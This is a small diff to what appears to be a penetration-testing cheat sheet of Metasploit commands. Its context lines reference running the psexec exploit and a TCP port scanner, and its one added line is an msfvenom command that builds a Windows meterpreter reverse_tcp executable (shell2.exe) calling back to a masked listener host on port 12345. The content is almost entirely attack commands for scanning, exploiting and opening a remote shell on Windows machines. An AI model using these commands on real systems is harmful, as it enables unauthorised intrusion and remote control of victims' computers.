@@ -21,3 +21,4 @@ msf exploit(psexec) > exploit
 -----------------------------------------------------------------
 use auxiliary/scanner/portscan/tcp
 -------------------------------------------
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=**** LPORT=12345 -f exe > shell2.exe
